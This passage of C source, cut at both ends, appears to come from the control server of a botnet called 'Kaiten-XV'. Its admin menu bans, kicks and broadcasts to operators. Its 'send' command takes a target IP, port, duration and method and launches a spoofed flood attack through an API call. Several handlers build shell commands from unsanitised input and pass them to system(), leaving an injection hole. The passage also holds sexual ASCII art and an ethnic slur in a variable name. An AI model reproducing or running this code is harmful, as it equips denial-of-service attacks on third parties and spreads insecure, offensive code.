						sprintf(sys,"sed '/\\<%s\\>/d' -i logs/BANNEDUSERS.txt", unbanuser);
						system(sys);
						sprintf(usethis, "\e[1;35mAccount \e[1;37m[%s] \e[1;35mHas Been UnBanned\r\n", unbanuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s UnBanned User: [%s]\n", managements[datafd].id, unbanuser);
					}
					else if(strstr(buf, "5") || strstr(buf, "FIVE") || strstr(buf, "Five") || strstr(buf, "five"))
					{
						char ipbanuser[80];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(ipbanuser, buf);
						sprintf(send1, "echo '%s' >> logs/IPBANNED.txt",ipbanuser);
						system(send1);
						sprintf(usethis, "\e[1;35m[%s] \e[1;36mHas Been IP Banned\r\n", buf);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s IP Banned: [%s]\r\n", managements[datafd].id, ipbanuser);
					}
					else if(strstr(buf, "6") || strstr(buf, "SIX") || strstr(buf, "Six") || strstr(buf, "six"))
					{
						char sys[800];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						sprintf(sys, "sed '/\\<%s\\>/d' -i logs/IPBANNED.txt", buf);
						system(sys);
						sprintf(usethis, "\e[1;35m[%s] \e[1;36mHas Been UnIPBanned\r\n", buf);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s UnIPBanned: [%s]\n", managements[datafd].id, buf);
					}
			
					else if(strcasestr(buf, "7") || strcasestr(buf, "seven"))
					{	
						int fail;
						char usertokick[800];
						sprintf(usethis, "Users Online\r\n");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						int kickonline;
						for(kickonline=0;kickonline < MAXFDS;kickonline++)
						{
							if(strlen(managements[kickonline].id) > 1 && managements[kickonline].connected == 1)
							{
								char kickonlineusers[800];
								sprintf(kickonlineusers, "| %s |\r\n", managements[kickonline].id);
								if(send(datafd, kickonlineusers, strlen(kickonlineusers), MSG_NOSIGNAL) == -1) goto end;
							}
						}
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(usertokick, buf);
			
						for(kickonline=0;kickonline<MAXFDS;kickonline++)
						{
							if(!strcmp(managements[kickonline].id, usertokick))
							{
								sprintf(usethis, "\r\n\e[1;31m You Have Been Kicked Out Of The Net!\r\n");
								if(send(kickonline, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								sent = 1;
								sleep(1);
								memset(managements[kickonline].id,0, sizeof(managements[kickonline].id));
								OperatorsConnected--;
								managements[kickonline].connected = 0;
								close(kickonline);
							}
						}
						if(sent != NULL)
						{
							sprintf(usethis,"\e[1;31mUser %s Has Been Kicked\r\n", usertokick);
							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
							printf("[Kaiten]:%s Kicked User: [%s]\r\n", managements[datafd].id, usertokick);
						}
			
						else if(!sent)
						{
							sprintf(usethis, "\e[1;35mUser %s Is Not Online.\r\n", usertokick);
							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						}
					}
			
					else if(strstr(buf, "8"))
					{
						char Blacklistip[80];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(Blacklistip, buf);
						sprintf(send1, "echo '%s' >> logs/Blacklist.txt",Blacklistip);
						system(send1);
						sprintf(usethis, "\e[1;35m[%s] \e[1;36mHas Been Blacklisted\r\n", Blacklistip);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s Blacklisted IP: [%s]\r\n", managements[datafd].id, Blacklistip);
					}
					else if(strstr(buf, "cls"));
					{
						//nun
					}
				} else {
			 		char noperms[800];
			 		sprintf(noperms, "\e[1;31m You Do Not Have Admin Perms\r\n");
			 		if(send(datafd, noperms, strlen(noperms), MSG_NOSIGNAL) == -1) goto end;
				}
			}

        if(strcasestr(buf, "motd"))
 		{
			if(managements[datafd].adminstatus == 1)
            {
           		char sendbuf[50]; 
 				memset(buf, 0, sizeof(buf));
 				sprintf(sendbuf, "\e[1;37mMOTD: "); 
 				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
 				fdgets(buf, sizeof(buf), datafd);
 				trim(buf);
 				if(strlen(buf) < 80)
 				{
 						motdaction = 1;
 						strcpy(motd, buf);
 						sprintf(usethis, "\e[1;37mMOTD Has Been Updated\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				}
			}
			else
			{
				char sendbuf[50]; 
				sprintf(sendbuf, "\e[1;31mYou Do Not Have Admin Perms\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
			}
			
 		}


 		else if(strcasestr(buf, "broadcast"))
 		{
 			if(managements[datafd].adminstatus == 1)
 			{
 				int brdcstthing;
 				int userssentto = 0;
 				int msgoff = 0;
 				sprintf(usethis, "MSG:");
 				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				memset(buf, 0, sizeof(buf));
 				if(fdgets(buf, sizeof(buf), datafd) > 1) goto end;
 				trim(buf);
 				strcpy(broadcastmsg, buf);
 				memset(buf,0,sizeof(buf));
 					if(strlen(broadcastmsg) < 80)
 					{
 						if(OperatorsConnected > 1)
 						{
 							for(brdcstthing=0;brdcstthing<MAXFDS;brdcstthing++)
 							{
 								if(managements[brdcstthing].connected == 1 && strcmp(managements[brdcstthing].id, managements[datafd].id) != 0)
 								{
 									if(managements[brdcstthing].broadcasttoggle == 0)
 									{
 										sprintf(usethis, "\r\n\e[1;35mBroadcasted Message From \e[1;36m[%s]\r\n \e[1;33m| \e[1;37mMSG: %s\r\n", managements[datafd].id, broadcastmsg);
 										if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
	
 										sprintf(usethis, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[brdcstthing].id);
 										if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 										sent = 1;
 										userssentto++;
 									} else {
 										msgoff++;
 									}
 								} else {
 									//nun
 								}
 							}
 						} else {
 							sprintf(usethis, "\e[1;37mThere Are Currently No Users Online\r\n");
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						}
 					} else {
 						sprintf(usethis, "\e[1;37mBroadcasted Message Cannot Be Over 80 Characters\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 					}

 					if(sent == 1)
 					{
	
 						sprintf(usethis, "\e[1;37mMessage Broadcasted To [%d] Users \e[1;33m| \e[1;35m[%d] Users Have Broadcast Toggled \e[1;31mOff\r\n", userssentto, msgoff);
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						sent = 0;
 						printf("\e[1;37m%s Broadcasted Message %s to [%d] Online Users \e[1;33m| \e[1;35m[%d] Users Have Broadcast Toggled \e[1;31mOff\r\n", managements[datafd].id, broadcastmsg, userssentto, msgoff);
 						userssentto = 0;
 						msgoff = 0;
 					}

 			} else {
				char sendbuf[50]; 
				sprintf(sendbuf, "\e[1;31mYou Do Not Have Admin Perms\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 		 				
 			}
 		}

 		if(strcasestr(buf, "ToggleListen"))
 		{
 			if(managements[datafd].adminstatus == 1)
 			{
 				if(managements[datafd].listenattacks == 0)
 				{
 					managements[datafd].listenattacks = 1;
 							sprintf(usethis2, "\e[1;37m────────────────────────────────────────\r\n");
                			sprintf(usethis, "\e[1;37mAttack Listen Has Been Turned \e[1;32mON\r\n");
                			sprintf(usethis3, "\e[1;37m────────────────────────────────────────\r\n");
                			if(send(datafd, usethis2, strlen(usethis2), MSG_NOSIGNAL) == -1) goto end;
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                			if(send(datafd, usethis3, strlen(usethis3), MSG_NOSIGNAL) == -1) goto end;
 				}
 				else if(managements[datafd].listenattacks == 1)
 				{
 					managements[datafd].listenattacks = 0;
 							sprintf(usethis2, "\e[1;37m────────────────────────────────────────\r\n");
                			sprintf(usethis, "\e[1;37mAttack Listen Has Been Turned \e[1;31mOFF\r\n");
                			sprintf(usethis3, "\e[1;37m────────────────────────────────────────\r\n");
                			if(send(datafd, usethis2, strlen(usethis2), MSG_NOSIGNAL) == -1) goto end;
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                			if(send(datafd, usethis3, strlen(usethis3), MSG_NOSIGNAL) == -1) goto end;
 				}
 			} else {
				char sendbuf[50]; 
				sprintf(sendbuf, "\e[1;31mYou Do Not Have Admin Perms\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 				
 			}
 		}

 		else if(strcasestr(buf, "ToggleAttacks"))
 		{
 			if(managements[datafd].adminstatus == 1)
 			{
 				if(AttackStatus == 0)
 				{
 							sprintf(usethis2, "\e[1;37m────────────────────────────\r\n");
                			sprintf(usethis, "\e[1;37mAttacks Have Been Toggled \e[1;31mOFF\r\n");
                			sprintf(usethis3, "\e[1;37m────────────────────────────\r\n");
                			if(send(datafd, usethis2, strlen(usethis2), MSG_NOSIGNAL) == -1) goto end;
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                			if(send(datafd, usethis3, strlen(usethis3), MSG_NOSIGNAL) == -1) goto end;
                			AttackStatus = 1;
 				} else {
 							sprintf(usethis2, "\e[1;37m────────────────────────────\r\n");
                			sprintf(usethis, "\e[1;37mAttacks Have Been Toggled \e[1;32mON\r\n");
                			sprintf(usethis3, "\e[1;37m────────────────────────────\r\n");
                			if(send(datafd, usethis2, strlen(usethis2), MSG_NOSIGNAL) == -1) goto end;
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                			if(send(datafd, usethis3, strlen(usethis3), MSG_NOSIGNAL) == -1) goto end;
                			AttackStatus = 0; 					
 				}
 			} else {
				char sendbuf[50]; 
				sprintf(sendbuf, "\e[1;31mYou Do Not Have Admin Perms\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	 				
 			}
 		}

 		else if(strcasestr(buf, "ToggleLogin"))
 		{
 			if(managements[datafd].adminstatus == 1)
 			{
 				if(managements[datafd].LoginListen == 1)
 				{
 					sprintf(usethis2, "─────────────────────────────────────────────\r\n");
 					sprintf(usethis, "\e[1;37mYou Have \e[1;31mStopped \e[1;37mListening To Logins/Logouts\r\n");
 					sprintf(usethis3, "─────────────────────────────────────────────\r\n");
 					if(send(datafd, usethis2, strlen(usethis2), MSG_NOSIGNAL) == -1) goto end;
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 					if(send(datafd, usethis3, strlen(usethis3), MSG_NOSIGNAL) == -1) goto end;
 					managements[datafd].LoginListen = 0;
 				} else {
 					sprintf(usethis2,"─────────────────────────────────────────────\r\n");
 					sprintf(usethis, "\e[1;37mYou Have \e[1;32mStarted \e[1;37mListening To Logins/Logouts\r\n");
 					sprintf(usethis3,"─────────────────────────────────────────────\r\n");
 					if(send(datafd, usethis2, strlen(usethis2), MSG_NOSIGNAL) == -1) goto end;
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 					if(send(datafd, usethis3, strlen(usethis3), MSG_NOSIGNAL) == -1) goto end;
 					managements[datafd].LoginListen = 1; 				
 				}
 			} else {
				char sendbuf[50]; 
				sprintf(sendbuf, "\e[1;31mYou Do Not Have Admin Perms\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	
 			}
 		}


		if(strstr(buf, "send"))
            {
            	char beanersquad[1024];
                char ip[80];
                char port[80];
                char time[80];
                char method[80];
   
                sprintf(beanersquad, "IP: ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
                strcpy(ip, buf);
                sleep(0.5);
   
                sprintf(beanersquad, "Port: ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
                strcpy(port, buf);
                sleep(0.5);
   
                sprintf(beanersquad, "Time: ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
                strcpy(time, buf);
                sleep(0.5);
   
                sprintf(beanersquad, "Method: ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
                strcpy(method, buf);
                sleep(0.5);
   
                apicall("spoofed", ip, port, time, method);

                sprintf(beanersquad, "\033[1A\033[2J\033[1;1H");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);

                sprintf(beanersquad, "\x1b[1;37m╔══════════════════════════════════╗\r\n");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);

                sprintf(beanersquad, "\x1b[1;37m║\x1b[1;35mKaiten \x1b[1;36mX\x1b[1;35mV \x1b[1;37mAttack Sent! \x1b[1;36m[API\x1b[1;35m]\r\n");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);

                sprintf(beanersquad, "\x1b[1;37m║\x1b[1;35mIP\x1b[1;37m:\x1b[1;36m %s\r\n", ip);
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);

                sprintf(beanersquad, "\x1b[1;37m║\x1b[1;35mPort\x1b[1;37m:\x1b[1;36m %s\r\n", port);
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);

                sprintf(beanersquad, "\x1b[1;37m║\x1b[1;35mTime\x1b[1;37m:\x1b[1;36m %s\r\n", time);
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);

                sprintf(beanersquad, "\x1b[1;37m║\x1b[1;35mMethod\x1b[1;37m:\x1b[1;36m %s\r\n", method);
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);

                sprintf(beanersquad, "\x1b[1;37m╚══════════════════════════════════╝\r\n");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);

                memset(ip, 0, sizeof(ip));
                memset(port, 0, sizeof(port));
                memset(time, 0, sizeof(time));
                memset(method, 0, sizeof(method));
            }

            if(strstr(buf, "TICKET") || strstr(buf, "Ticket") || strstr(buf, "ticket")) {
			char r2  [800];

				sprintf(r2,  "\e[0m OPEN (NAME) (QUESTION) \e[0m\r\n");

				if(send(datafd, r2,  strlen(r2), MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[datafd].id);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "OPEN") || strstr(buf, "Open") || strstr(buf, "open")) {
                FILE *TicketOpen;
                TicketOpen = fopen("Ticket_Open.txt", "a");
			    time_t now;
			    struct tm *gmt;
			    char formatted_gmt [50];
			    char lcltime[50];
			    now = time(NULL);
			    gmt = gmtime(&now);
			    strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
                fprintf(TicketOpen, "Support Ticket Open - [%s] %s\n", formatted_gmt, buf);
                fclose(TicketOpen);
                char ry1  [800];
                sprintf(ry1,  "\e[0m (Ticket Has Been Open)\r\n");              
				if(send(datafd, ry1,  strlen(ry1),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[datafd].id);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
///////////////////////////////////////////////////////////////////////////////////////////////END OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
if(strcasestr(buf, "America") || strcasestr(buf, "america")) 
			{
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				char flag1[2048];
				char flag2[2048];
				char flag3[2048];
				char flag4[2048];
				char flag5[2048];
				char flag6[2048];
				char flag7[2048];
				char flag8[2048];
				char flag9[2048];
				char flag10[2048];
				char flag11[2048];
				char flag12[2048];
				char flag13[2048];
				char flag14[2048];
				char flag15[2048];
				char flag16[2048];
				char flag17[2048];
				char flag18[2048];
				char flag19[2048];
				char flag20[2048];
				char flag21[2048];
				char flag22[2048];
				char flag23[2048];
				sprintf(flag1,  "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;196m###########################################\r\n");
				sprintf(flag2,  "\e[38;5;17m8888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888888\e[38;5;196m###########################################\r\n");
				sprintf(flag3,  "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231m###########################################\r\n");
				sprintf(flag4,  "\e[38;5;17m8888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888888\e[38;5;231m###########################################\r\n");
				sprintf(flag5,  "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;196m###########################################\r\n");
				sprintf(flag6,  "\e[38;5;17m8888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888888\e[38;5;231m###########################################\r\n"); 
				sprintf(flag7,  "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;196m###########################################\r\n");
				sprintf(flag8, "\e[38;5;17m8888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888888\e[38;5;231m###########################################\r\n");
				sprintf(flag9, "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;196m###########################################\r\n");
				sprintf(flag10, "\e[38;5;231m###########################################################################\r\n");
				sprintf(flag11, "\e[38;5;196m###########################################################################\r\n");
				sprintf(flag12, "\e[38;5;196m###########################################################################\r\n");
				sprintf(flag13, "\e[38;5;231m###########################################################################\r\n");
				sprintf(flag14, "\e[38;5;196m###########################################################################\r\n");
				sprintf(flag15, "\e[38;5;196m###########################################################################\r\n");
				sprintf(flag16, "\e[38;5;231m###########################################################################\r\n");
				sprintf(flag17, "\e[38;5;196m###########################################################################\r\n");
				sprintf(flag18, "\e[38;5;196m###########################################################################\r\n");
				if(send(datafd, flag1, strlen(flag1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag2, strlen(flag2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag3, strlen(flag3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag4, strlen(flag4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag5, strlen(flag5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag6, strlen(flag6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag7, strlen(flag7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag8, strlen(flag8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag9, strlen(flag9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag10, strlen(flag10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag11, strlen(flag11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag12, strlen(flag12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag13, strlen(flag13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag14, strlen(flag14), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag15, strlen(flag15), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag16, strlen(flag16), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag17, strlen(flag17), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, flag18, strlen(flag18), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, ktn_banner1,  strlen(ktn_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner2,  strlen(ktn_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, ktn_banner3,  strlen(ktn_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner4,  strlen(ktn_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner5,  strlen(ktn_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner6,  strlen(ktn_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner7,  strlen(ktn_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner8,  strlen(ktn_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner9,  strlen(ktn_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannera,  strlen(ktn_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannerb,  strlen(ktn_bannerb),	MSG_NOSIGNAL) == -1) goto end;
			}

			if(strcasestr(buf, "titties") || strcasestr(buf, "boobs") || strcasestr(buf, "boobies") || strcasestr(buf, "Tiddies"))
			{
				
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				
				char biddies1[2048];
				char biddies2[2048];
				char biddies3[2048];
				char biddies4[2048];
				char biddies5[2048];
				char biddies6[2048];
				char biddies7[2048];
				char biddies8[2048];
				char biddies9[2048];
				char biddies10[2048];
				char biddies11[2048];
				char biddies12[2048];
				char biddies13[2048];
				char biddies14[2048];
				char biddies15[2048];
				char biddies16[2048];
				char biddies17[2048];
				char biddies18[2048];
				char biddies19[2048];
				char biddies20[2048];
				char biddies21[2048];
				char biddies22[2048];
				char biddies23[2048];
				
				sprintf(biddies1,  "\e[38;5;236m  88  M\e[38;5;216m::::::::::\e[38;5;236m8888M::88888::888888\e[38;5;236m888888:\e[38;5;216m::::::Mm88888                    \r\n");
				sprintf(biddies2,  "\e[38;5;236m8   MM\e[38;5;216m::::::::\e[38;5;236m8888\e[38;5;216mM:::\e[38;5;236m8888\e[38;5;216m:::::\e[38;5;236m888888888888::\e[38;5;216m::::::Mm8                       \r\n");
				sprintf(biddies3,  "\e[38;5;236m    8M\e[38;5;216m:::::::\e[38;5;236m8888\e[38;5;216mM:::::\e[38;5;236m888\e[38;5;216m:::::::\e[38;5;236m88\e[38;5;216m:::\e[38;5;236m8888888\e[38;5;216m::::::::Mm                      \r\n");
				sprintf(biddies4,  "\e[38;5;236m   88MM\e[38;5;216m:::::\e[38;5;236m8888\e[38;5;216mM:::::::\e[38;5;236m88\e[38;5;216m::::::::\e[38;5;236m8\e[38;5;216m:::::\e[38;5;236m888888\e[38;5;216m:::M:::::M                     \r\n");
				sprintf(biddies5,  "\e[38;5;236m  8888M\e[38;5;216m:::::\e[38;5;236m888\e[38;5;216mMM::::::::\e[38;5;236m8\e[38;5;216m:::::::::::M::::\e[38;5;236m8888\e[38;5;216m::::M::::M                     \r\n");
				sprintf(biddies6,  "\e[38;5;236m 88888m\e[38;5;216m:::::\e[38;5;236m88\e[38;5;216m:M::::::::::\e[38;5;236m8\e[38;5;216m:::::::::::M:::\e[38;5;236m8888\e[38;5;216m::::::M::M                     \r\n");
				sprintf(biddies7,  "\e[38;5;236m88 888MM\e[38;5;216m:::\e[38;5;236m888\e[38;5;216m:M:::::::::::::::::::::::M:\e[38;5;236m8888\e[38;5;216m:::::::::M:                     \r\n");
				sprintf(biddies8,  "\e[38;5;236m8 88888M\e[38;5;216m:::\e[38;5;236m88\e[38;5;216m::M:::::::::::::::::::::::MM:\e[38;5;236m88\e[38;5;216m::::::::::::M                    \r\n");
				sprintf(biddies9,  "\e[38;5;236m  88888M\e[38;5;216m:::\e[38;5;236m88\e[38;5;216m::M::::::::::\e[38;5;168m*88*\e[38;5;216m::::::::::M:\e[38;5;236m88\e[38;5;216m::::::::::::::M  \r\n");
				sprintf(biddies10, "\e[38;5;236m 888888M\e[38;5;216m:::\e[38;5;236m88\e[38;5;216m::M:::::::::\e[38;5;168m88@@88\e[38;5;216m:::::::::M::\e[38;5;236m88\e[38;5;216m::::::::::::::M \r\n");
				sprintf(biddies11, "\e[38;5;236m 888888MM\e[38;5;216m::\e[38;5;236m88\e[38;5;216m::MM::::::::\e[38;5;168m88@@88\e[38;5;216m:::::::::M:::\e[38;5;236m8\e[38;5;216m::::::::::::::*8\r\n");
				sprintf(biddies12, "\e[38;5;236m 88888  \e[38;5;216mM:::\e[38;5;236m8\e[38;5;216m::MM:::::::::\e[38;5;168m*88*\e[38;5;216m::::::::::M:::::::::::::::::\e[38;5;168m88@@\r\n");
				sprintf(biddies13, "\e[38;5;236m 8888  \e[38;5;216m MM::::::MM:::::::::::::::::::::MM:::::::::::::::::\e[38;5;168m88@@       \r\n");
				sprintf(biddies14, "\e[38;5;236m  888  \e[38;5;216m  M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8                \r\n");
				sprintf(biddies15, "\e[38;5;236m   888  \e[38;5;216m  MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M                \r\n");
				sprintf(biddies16, "\e[38;5;236m    88  \e[38;5;216m   M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM                 \r\n");
				sprintf(biddies17, "\e[38;5;236m     88  \e[38;5;216m  MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM                  \r\n");
				sprintf(biddies18, "\e[38;5;236m      88  \e[38;5;216m  MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM                    \r\n");
				sprintf(biddies19, "\e[38;5;236m       88  \e[38;5;216m 8MM::::::::::::::::::::::::::::::::::MMMMMM                      \r\n");
				sprintf(biddies20, "\e[38;5;236m        8  \e[38;5;216m 88MM::::::::::::::::::::::M:::M::::::::MM                        \r\n");
				sprintf(biddies21, "\e[38;5;216m            888MM::::::::::::::::::MM::::::MM::::::MM                        \r\n");
				sprintf(biddies22, "\e[38;5;216m           88888MM::::::::::::::MMM::::::::mM:::::M                          \r\n");
				sprintf(biddies23, "\e[38;5;216m          888888MM::::::::::::MMM::::::::::MMM:::M                           \r\n");
				
				if(send(datafd, biddies1, strlen(biddies1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies2, strlen(biddies2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies3, strlen(biddies3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, biddies4, strlen(biddies4), MSG_NOSIGNAL) == -1) goto end;
